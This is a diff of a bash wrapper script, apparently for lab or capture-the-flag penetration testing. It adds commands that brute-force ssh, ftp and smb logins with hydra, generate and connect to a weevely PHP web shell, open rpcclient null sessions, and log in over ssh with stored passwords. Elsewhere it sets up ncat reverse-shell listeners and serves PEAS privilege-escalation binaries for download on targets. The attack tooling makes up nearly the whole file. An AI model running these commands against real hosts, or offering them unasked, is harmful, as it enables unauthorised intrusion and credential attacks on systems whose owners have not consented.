@@ -15,12 +15,18 @@ prompt() {
 }
 
 show_help() {
-  echo -e "\n[ FOXACID || Commando Script ]\n"
-  echo -e "Author: Doomguy (https://github.com/doomguy)\n"
-  echo "Commands:"
+  echo -e "\n[ FOXACID || Commando Script ][ Doomguy: https://github.com/doomguy ]\n"
+  echo "Available commands:"
   grep "^##" "$0" | cut -d' ' -f2- | while IFS= read -r cmd; do
     echo -e "  fxy $cmd"
   done | sort
+}
+
+checkCmd() {
+  if [ ! "$(which "$CMD")" ]; then
+    echo "[!] '$CMD' required but missing."
+    exit
+  fi
 }
 
 getIP() {
@@ -36,22 +42,56 @@ getIP() {
 
 showCreds() {
   FILE="creds.txt"
-    if [ ! -e "$FILE" ]; then
-    echo "[!] No '$FILE' found!"
-    exit
-  fi
   echo "Available creds:"
-  column -t -s':' "$FILE" | cat -n
+  echo "     0  (Use for NULL sessions)"
+  if [ -e "$FILE" ]; then
+    column -t -s':' "$FILE" | cat -n
+  else
+    echo -e "\n[*] No '$FILE' found!"
+  fi
+  exit
 }
 
 getCreds() {
+  if [ "$CID" -eq 0 ]; then
+    USRNME="NULL"
+    PASSWD="NULL"
+  else
+    FILE="creds.txt"
+    if [ ! -e "$FILE" ]; then
+      echo "[!] No '$FILE' found!"; exit
+    fi
+    if [ "$CID" -gt "$(wc -l $FILE | cut -d' ' -f1)" ]; then
+      echo "[!] Invalid credential ID!"; exit
+    fi
+
+    USRNME=$(sed -n "${CID}p" "$FILE" | cut -d':' -f1)
+    PASSWD=$(sed -n "${CID}p" "$FILE" | cut -d':' -f2)
+  fi
+}
+
+createUserPassLists() {
   FILE="creds.txt"
   if [ ! -e "$FILE" ]; then
-    echo "[!] No '$FILE' found!"
-    exit
+    echo "[!] No '$FILE' found!"; exit
   fi
-  USRNME=$(sed -n "${CID}p" "$FILE" | cut -d':' -f1)
-  PASSWD=$(sed -n "${CID}p" "$FILE" | cut -d':' -f2)
+  FPATH="/dev/shm/.fxy"
+  if [ ! -d "$FPATH" ]; then
+    mkdir "$FPATH"
+  fi
+  # userlist
+  if [ "$(which "genuserlst.py")" ]; then
+    genuserlst.py "$FILE" | tr '[:upper:]' '[:lower:]' | sort -u > "$FPATH/user.lst"
+  else
+    echo "[*] Did not find 'genuserlst.py' in PATH. Falling back to standard mode."
+    cut -d: -f1 "$FILE" | tr '[:upper:]' '[:lower:]' | sort -u | grep -v ^$ > "$FPATH/user.lst"
+  fi
+  # passlist
+  cut -d: -f2 "$FILE" | sort -u | grep -v ^$ > "$FPATH/pass.lst"
+}
+
+getMachinePass() {
+  PASSWD="$(echo -n "$(hostname)$(cat /sys/class/net/*/address | head -n1)" | sha256sum | cut -c1-20)"
 }
 
 ## h(elp)\t\t\t\t\t: Show this help
@@ -61,6 +101,7 @@ if [ ! "$#" -ge 1 ] || [ "$1" == "h" ] || [ "$1" == "help" ]|| [ "$1" == "-h" ] 
 fi
 
 ## r(host) [target]\t\t\t\t: Show/Set RHOST
+# Set RHOST
 if [ "$#" -eq 2 ] && { [ "$1" == "r" ] || [ "$1" == "rhost" ]; }; then
   FPATH="/dev/shm/.fxy"
   FILE="/dev/shm/.fxy/rhost"
@@ -96,6 +137,42 @@ if [ "$#" -eq 1 ] && { [ "$1" == "r" ] || [ "$1" == "rhost" ]; }; then
   exit
 fi
 
+## creds [add user:pass]\t\t\t: Show/Add creds
+if [ "$1" == "creds" ]; then
+  FILE="creds.txt"
+  if [ "$#" -eq 1 ]; then
+    showCreds; exit
+  elif [ "$2" == "add" ] && [ "$#" -eq 3 ]; then
+    # add entry
+    ENTRY="$3"
+    if [[ ! "$ENTRY" =~ .*:$ ]]; then
+      ENTRY="$ENTRY:"
+    fi
+    CMD="echo '$ENTRY' >> $FILE"
+  elif [ "$2" == "del" ] && [ "$#" -eq 3 ]; then
+    # del entry
+    CID="$3"
+    if [ ! -e "$FILE" ]; then
+      echo "[!] No '$FILE' found!"; exit
+    fi
+    if [ "$CID" -gt "$(wc -l $FILE | cut -d' ' -f1)" ] || [ "$CID" -eq 0 ]; then
+      echo "[!] Invalid credential ID!"; exit
+    fi
+    CMD="sed -i '${CID}d' $FILE"
+  fi
+  echo "> $CMD"
+  prompt
+  bash -c "$CMD"
+  exit
+fi
+
+## pass(word)\t\t\t\t: Show machine password
+if [ "$#" -eq 1 ] && { [ "$1" == "pass" ] || [ "$1" == "password" ]; }; then
+  getMachinePass
+  echo "  PASS: $PASSWD"
+  exit
+fi
+
 ## httpd|ws [port]\t\t\t\t: python3 -m http.server PORT
 if [ "$1" == "httpd" ] || [ "$1" == "ws" ] ; then
   CMD="python3 -m http.server"
@@ -114,15 +191,15 @@ if [ "$1" == "httpd" ] || [ "$1" == "ws" ] ; then
   exit
 fi
 
-## l(isten) [port]\t\t\t\t: nc -vlkp PORT
+## l(isten) [port]\t\t\t\t: ncat -vlkp PORT
 if [ "$1" == "l" ] || [ "$1" == "listen" ] ; then
-  CMD="nc -vlkp"
+  CMD="ncat"; checkCmd
   if [ "$#" -eq 2 ]; then
     PORT="$2"
   else
     PORT="9001"
   fi
-  CMD="$CMD $PORT"
+  CMD="$CMD -vlkp $PORT"
   echo "> $CMD"
   bash -c "$CMD"
   exit
@@ -130,25 +207,25 @@ fi
 
 ## n(map) [full]\t\t\t\t: nmap -v -A (-p-) RHOST | tee
 if [ "$1" == "n" ] || [ "$1" == "nmap" ]; then
-  CMD="nmap -v -A"
+  CMD="nmap"; checkCmd
   if [ "$#" -eq 2 ] && [ "$2" == "full" ]; then
     CMD="$CMD -p-"
   fi
-  CMD="$CMD $RHOST | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S).log"
+  CMD="$CMD -v -A $RHOST -oA ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S)"
   echo "> $CMD"
   prompt
   bash -c "$CMD"
   exit
 fi
 
-## nikto [s|ssl|tls] [SUBDIR]\t\t: nikto -host PROTO://RHOST+SUBDIR | tee
+## nikto [s|ssl|tls] [subdir]\t\t: nikto -host PROTO://RHOST+SUBDIR | tee
 if [ "$1" == "nikto" ]; then
-  CMD="nikto -host"
+  CMD="$1"; checkCmd
   PROTO="http"
   SUBDIR="/"
   # more than 1 arg?
   if [ "$#" -ge 2 ]; then
-    # is it https?
+    # https?
     if [ "$2" == "s" ] || [ "$2" == "ssl" ] || [ "$2" == "tls" ]; then
       PROTO="https"
     fi
@@ -160,7 +237,7 @@ if [ "$1" == "nikto" ]; then
     fi
   fi
 
-  CMD="$CMD $PROTO://${RHOST}${SUBDIR} | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S).log"
+  CMD="$CMD -host $PROTO://${RHOST}${SUBDIR} | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S).log"
   echo "> $CMD"
   prompt
   bash -c "$CMD"
@@ -169,7 +246,7 @@ fi
 
 ## cme [smb]\t\t\t\t\t: crackmapexec smb RHOST | tee
 if [ "$1" == "cme" ] || [ "$1" == "crackmapexec" ]; then
-  CMD="crackmapexec"
+  CMD="crackmapexec"; checkCmd
   if [ "$#" -eq 2 ] && [ "$2" == "smb" ]; then
     CMD="$CMD smb"
   else
@@ -182,14 +259,14 @@ if [ "$1" == "cme" ] || [ "$1" == "crackmapexec" ]; then
   exit
 fi
 
-## dirb [s|ssl|tls] [SUBDIR]\t\t\t: dirb PROTO://RHOST+SUBDIR | tee
+## dirb [s|ssl|tls] [subdir]\t\t\t: dirb PROTO://RHOST+SUBDIR | tee
 if [ "$1" == "dirb" ]; then
-  CMD="dirb"
+  CMD="$1"; checkCmd
   PROTO="http"
   SUBDIR="/"
   # more than 1 arg?
   if [ "$#" -ge 2 ]; then
-    # is it https?
+    # https?
     if [ "$2" == "s" ] || [ "$2" == "ssl" ] || [ "$2" == "tls" ]; then
       PROTO="https"
     fi
@@ -208,14 +285,14 @@ if [ "$1" == "dirb" ]; then
   exit
 fi
 
-## curl [s|ssl|tls] [SUBDIR]\t\t\t: curl -si PROTO://RHOST+SUBDIR | less
+## curl [s|ssl|tls] [subdir]\t\t\t: curl -si PROTO://RHOST+SUBDIR | less
 if [ "$1" == "curl" ]; then
-  CMD="curl -ski"
+  CMD="$1"; checkCmd
   PROTO="http"
   SUBDIR="/"
   # more than 1 arg?
   if [ "$#" -ge 2 ]; then
-    # is it https?
+    # https?
     if [ "$2" == "s" ] || [ "$2" == "ssl" ] || [ "$2" == "tls" ]; then
       PROTO="https"
     fi
@@ -227,16 +304,16 @@ if [ "$1" == "curl" ]; then
     fi
   fi
 
-  CMD="$CMD $PROTO://${RHOST}${SUBDIR} | less"
+  CMD="$CMD -ski $PROTO://${RHOST}${SUBDIR} | less"
   echo "> $CMD"
   prompt
   bash -c "$CMD"
   exit
 fi
 
-## p(ing) [:count]\t\t\t\t: ping -c COUNT RHOST
+## p(ing) [count]\t\t\t\t: ping -c COUNT RHOST
 if [ "$1" == "p" ] || [ "$1" == "ping" ]; then
-  CMD="ping"
+  CMD="ping"; checkCmd
 
   if [ "$#" -eq 2 ]; then
     CMD="$CMD -c $2"
@@ -248,9 +325,9 @@ if [ "$1" == "p" ] || [ "$1" == "ping" ]; then
   exit
 fi
 
-## smbpasswd [:id]\t\t\t\t: smbpasswd -r RHOST -U :id
+## smbpasswd [cid]\t\t\t\t: smbpasswd -r RHOST -U :cid_user
 if [ "$1" == "smbpasswd" ]; then
-  CMD="smbpasswd -r $RHOST -U"
+  CMD="$1"; checkCmd
 
   # No ID supplied
   if [ "$#" -eq 1 ]; then
@@ -264,7 +341,7 @@ if [ "$1" == "smbpasswd" ]; then
     getCreds
   fi
 
-  CMD="$CMD $USRNME"
+  CMD="$CMD -r $RHOST -U $USRNME"
   echo "Password: $PASSWD"
   echo "> $CMD"
   prompt
@@ -272,9 +349,9 @@ if [ "$1" == "smbpasswd" ]; then
   exit
 fi
 
-## (evil-)winrm [:id]\t\t\t: evil-winrm -i RHOST -u :id_user -p :id_pass
+## (evil-)winrm [cid]\t\t\t: evil-winrm -i RHOST -u :cid_user -p :cid_pass
 if [ "$1" == "evil-winrm" ] || [ "$1" == "winrm" ]; then
-  CMD="evil-winrm -i $RHOST"
+  CMD="evil-winrm"; checkCmd
 
   # No ID supplied
   if [ "$#" -eq 1 ]; then
@@ -288,7 +365,7 @@ if [ "$1" == "evil-winrm" ] || [ "$1" == "winrm" ]; then
     getCreds
   fi
 
-  CMD="$CMD -u '$USRNME' -p '$PASSWD'"
+  CMD="$CMD -i $RHOST -u '$USRNME' -p '$PASSWD'"
   echo "> $CMD"
   prompt
   bash -c "$CMD"
@@ -322,7 +399,7 @@ if [ "$1" == "peas" ] && [ "$#" -ge 2 ] && { [ "$2" == "lin" ] || [ "$2" == "win
     "winany")    wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe' -O "$FPATH/winPEASany.exe" ;;
     "win86")     wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx86.exe' -O "$FPATH/winPEASx86.exe" ;;
     "win64")     wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx64.exe' -O "$FPATH/winPEASx64.exe" ;;
-   *)            echo "[!] Error parsing PEAS version for download!" ;;
+    *)           echo "[!] Error parsing PEAS version for download!"; exit ;;
   esac
 
   PORT="80"
@@ -339,7 +416,7 @@ if [ "$1" == "peas" ] && [ "$#" -ge 2 ] && { [ "$2" == "lin" ] || [ "$2" == "win
     "winany")    echo "  Invoke-WebRequest -OutFile winPEASany.exe -Uri http://$(getIP)/winPEASany.exe" ;;
     "win86")     echo "  Invoke-WebRequest -OutFile winPEASx86.exe -Uri http://$(getIP)/winPEASx86.exe" ;;
     "win64")     echo "  Invoke-WebRequest -OutFile winPEASx64.exe -Uri http://$(getIP)/winPEASx64.exe"  ;;
-   *)            echo "[!] Error parsing PEAS version for help text!" ;;
+    *)           echo "[!] Error parsing PEAS version for help text!"; exit ;;
   esac
 
   echo "$(tput sgr0) "
@@ -360,10 +437,11 @@ fi
 
 # wfuzz vhost
 if [ "$1" == "wfuzz" ] && [ "$2" == "vhost" ]; then
+  CMD="$1"; checkCmd
   PROTO="http"
   DOMAIN="$RHOST"
   if [ "$#" -ge 3 ]; then
-    # is it https?
+    # https?
     if [ "$3" == "s" ] || [ "$3" == "ssl" ] || [ "$3" == "tls" ]; then
       PROTO="https"
     fi
@@ -392,7 +470,7 @@ if [ "$1" == "wfuzz" ] && [ "$2" == "vhost" ]; then
   if [ "$#" -eq 6 ] && [ "$PROTO" == "https" ]; then HW="--hw $5"; HC="--hc $6"; fi
 
   CMD="wfuzz -H 'Host: FUZZ.$DOMAIN' -u '$PROTO://$RHOST' -w $FPATH/subdomains-top1million-20000.txt $HW $HC"
-  CMD="$CMD | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S).log"
+  CMD="$CMD | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_vhost_$(date +%F_%H%M%S).log"
   echo "> $CMD"
   prompt
   bash -c "$CMD"
@@ -402,10 +480,11 @@ fi
 
 # wfuzz normal
 if [ "$1" == "wfuzz" ] && [ "$2" != "vhost" ]; then
+  CMD="$1"; checkCmd
   PROTO="http"
   SUB="/"
   if [ "$#" -ge 2 ]; then
-    # is it https?
+    # https?
     if [ "$2" == "s" ] || [ "$2" == "ssl" ] || [ "$2" == "tls" ]; then
       PROTO="https"
     fi
@@ -432,18 +511,18 @@ if [ "$1" == "wfuzz" ] && [ "$2" != "vhost" ]; then
   exit
 fi
 
-## cewl [s|ssl|tls] [SUBDIR]\t\t\t: cewl PROTO://RHOST+SUBDIR -w RHOST_cewl.txt
+## cewl [s|ssl|tls] [subdir]\t\t\t: cewl PROTO://RHOST+SUBDIR -w RHOST_cewl.txt
 if [ "$1" == "cewl" ]; then
-  CMD="cewl"
+  CMD="$1"; checkCmd
   PROTO="http"
   SUBDIR="/"
   # more than 1 arg?
   if [ "$#" -ge 2 ]; then
-    # is it https?
+    # https?
     if [ "$2" == "s" ] || [ "$2" == "ssl" ] || [ "$2" == "tls" ]; then
       PROTO="https"
     fi
-
+    # subdir?
     if [ "$#" -eq 3 ] && [ "$PROTO" == "https" ]; then
       SUBDIR="$3"
     elif [ "$#" -eq 2 ] && [ "$PROTO" == "http" ]; then
@@ -458,12 +537,230 @@ if [ "$1" == "cewl" ]; then
   exit
 fi
 
-# showmount -e 10.10.10.180
+## ssh [cid] [port]\t\t\t\t: sshpass -e ssh :cid_user@RHOST -p PORT
+if [ "$1" == "ssh" ]; then
+  if [ ! "$(which sshpass)" ]; then
+    echo "[!] 'sshpass' required but missing."
+    CMD="sudo apt install sshpass"
+    echo "> $CMD"
+    prompt
+    bash -c "$CMD"
+  fi
+
+  # No ID supplied
+  if [ "$#" -eq 1 ]; then
+    showCreds
+    exit
+  fi
+
+  # CredID supplied
+  if [ "$#" -ge 2 ]; then
+    CID="$2"
+    getCreds
+  fi
+
+  export SSHPASS=$PASSWD
+  CMD="sshpass -v -e ssh -o StrictHostKeyChecking=no $USRNME@$RHOST"
+
+  # port?
+  if [ "$#" -eq 3 ]; then
+    PORT="$3"
+    CMD="$CMD -p $PORT"
+  fi
+
+  echo "> $CMD"
+  bash -c "$CMD"
+  exit
+fi
+
+## nfs|showmount\t\t\t\t: showmount -e RHOST
+if [ "$1" == "nfs" ] || [ "$1" == "showmount" ]; then
+  CMD="showmount"; checkCmd
+  CMD="showmount -e $RHOST"
+  echo "> $CMD"
+  prompt
+  bash -c "$CMD"
+  exit
+fi
+
+## (i)conv|convert [file]\t\t\t: iconv -f UTF-16LE -t UTF-8 FILE -o FILE.conv
+if { [ "$1" == "iconv" ] || [ "$1" == "conv" ] || [ "$1" == "convert" ]; } && [ "$#" -eq 2 ]; then
+  CMD="iconv"; checkCmd
+
+  FILE="$2"
+  if [ ! -f "$FILE" ]; then
+    echo "[!] Invalid input file!"; exit
+  fi
+
+  CMD="iconv -f UTF-16LE -t UTF-8 $FILE -o $FILE.conv"
+  echo "> $CMD"
+  prompt
+  bash -c "$CMD"
+  exit
+fi
+
+## weevely [gen|help]\t\t\t: weevely php shell
+# weevely help
+if [ "$1" == "weevely" ] && [ "$#" -ge 2 ] && [ "$2" == "help" ]; then
+  echo "Available commands:"
+  echo "  fxy weevely gen [file] [password]"
+  echo "  fxy weevely [s|ssl|tls] [subdir] [file] [password]"
+  exit
+fi
+
+# weevely generate
+if [ "$1" == "weevely" ] && [ "$#" -ge 2 ] && [ "$2" == "gen" ]; then
+  CMD="$1"; checkCmd
+  FILE="fxy.php"
+  getMachinePass
+  # filename?
+  if [ "$#" -eq 3 ]; then
+    FILE="$3"
+  fi
+  # pasword?
+  if [ "$#" -eq 4 ]; then
+    PASSWD="$4"
+  fi
+  CMD="$CMD generate $PASSWD $FILE"
+  echo "> $CMD"
+  prompt
+  bash -c "$CMD"
+  exit
+fi
+
+# weevely connect mode
+if [ "$1" == "weevely" ]; then
+  CMD="$1"; checkCmd
+  FILE="fxy.php"
+  PROTO="http"
+  SUBDIR="/"
+  # more than 1 arg?
+  if [ "$#" -ge 2 ]; then
+    # https?
+    if [ "$2" == "s" ] || [ "$2" == "ssl" ] || [ "$2" == "tls" ]; then
+      PROTO="https"
+    fi
+    # subdir?
+    if [ "$#" -eq 3 ] && [ "$PROTO" == "https" ]; then
+      SUBDIR="$3"
+    elif [ "$#" -eq 2 ] && [ "$PROTO" == "http" ]; then
+      SUBDIR="$2"
+    fi
+    # filename?
+    if [ "$#" -eq 4 ] && [ "$PROTO" == "https" ]; then
+      FILE="$4"
+    elif [ "$#" -eq 3 ] && [ "$PROTO" == "http" ]; then
+      FILE="$3"
+    fi
+    # password?
+    if [ "$#" -eq 5 ] && [ "$PROTO" == "https" ]; then
+      PASSWD="$5"
+    elif [ "$#" -eq 4 ] && [ "$PROTO" == "http" ]; then
+      PASSWD="$4"
+    fi
+  fi
+  getMachinePass
+  CMD="$CMD $PROTO://${RHOST}${SUBDIR}${FILE} $PASSWD"
+  echo "> $CMD"
+  prompt
+  bash -c "$CMD"
+  exit
+fi
+
+## rpc(client) [cid] [domain] [cmd]\t\t: rpcclient
+#rpcclient -A auth.txt -W domain.local 10.10.10.193 -c "enumdomusers" > out.txt
+if [ "$1" == "rpc" ] || [ "$1" == "rpcclient" ]; then
+  CMD="rpcclient"; checkCmd
+
+  # No ID supplied
+  if [ "$#" -eq 1 ]; then
+    showCreds
+    exit
+  fi
+
+  # CredID supplied
+  if [ "$#" -ge 2 ]; then
+    # NULL session?
+    if [ "$2" -eq 0 ]; then
+      CMD="$CMD -U '' -N"
+    else
+      CID="$2"
+      getCreds
+      CMD="$CMD -U '$USRNME%$PASSWD'"
+    fi
+  fi
+
+  # workgroup?
+  WRKGRP=""
+  if [ "$#" -ge 3 ]; then
+    WRKGRP="-W $3"
+  fi
+
+  # command?
+  CMND=""
+  if [ "$#" -ge 4 ]; then
+    CMND="-c $4 | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$4_$(date +%F_%H%M%S).log"
+  fi
+
+  CMD="$CMD $WRKGRP $RHOST $CMND"
+  echo "> $CMD"
+  prompt
+  bash -c "$CMD"
+  exit
+fi
+
+## hydra [service] [port] [username]\t\t: hydra brute force (ssh, ftp, smb)
+# hydra help
+if [ "$1" == "hydra" ] && [ "$#" -eq 1 ]; then
+  echo "Available commands:"
+  echo "  fxy hydra ssh [port] [username]"
+  echo "  fxy hydra ftp [port] [username]"
+  echo "  fxy hydra smb [port] [username]"
+  #echo "  fxy hydra http [url] [username]"
+  exit
+fi
+
+# hydra -I -L user.lst -P pass.lst -u -e sr -s 22333 127.0.0.1 ssh
+# hydra -I -L user.lst -P pass.lst -u -e sr -s 21 127.0.0.1 ftp
+# hydra -I -L user.lst -P pass.lst -u -e sr -s 445 127.0.0.1 smb
+if { [ "$1" == "hydra" ] || [ "$1" == "brute" ]; } && [ "$#" -ge 2 ]; then
+  CMD="hydra"; checkCmd
+  createUserPassLists
+  FPATH="/dev/shm/.fxy"
+
+  case "$2" in
+    "ssh" )   PORT="-s 22"; SVC="ssh" ;;
+    "ftp")    PORT="-s 21"; SVC="ftp" ;;
+    "smb")    PORT="-s 445"; SVC="smb" ;;
+    *)        echo "[!] Error parsing service to attack!"; exit ;;
+  esac
+
+  if [ "$#" -ge 3 ]; then
+    PORT="-s $3"
+  fi
+
+  if [ "$#" -ge 4 ]; then
+    USRNME="-l $4"
+  else
+    USRNME="-L $FPATH/user.lst"
+  fi
+
+  CMD="hydra -I $USRNME -P $FPATH/pass.lst -u -e sr $PORT $RHOST $SVC"
+  echo "> $CMD"
+  prompt
+  bash -c "$CMD"
+  exit
+fi
+
+
 # fcrackzip -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip
-# # gobuster dir -u http://10.10.10.191/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
-# hydra
+# gobuster dir -u http://10.10.10.191/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
+# hydra ssh ftp basicauth smb
 # msf multi handler
-# weevely
+# msf venom most common
+# smbclient
+# smbmap
+# enum4linux
 
 # Nothing found? Invalid command?
 show_help; exit
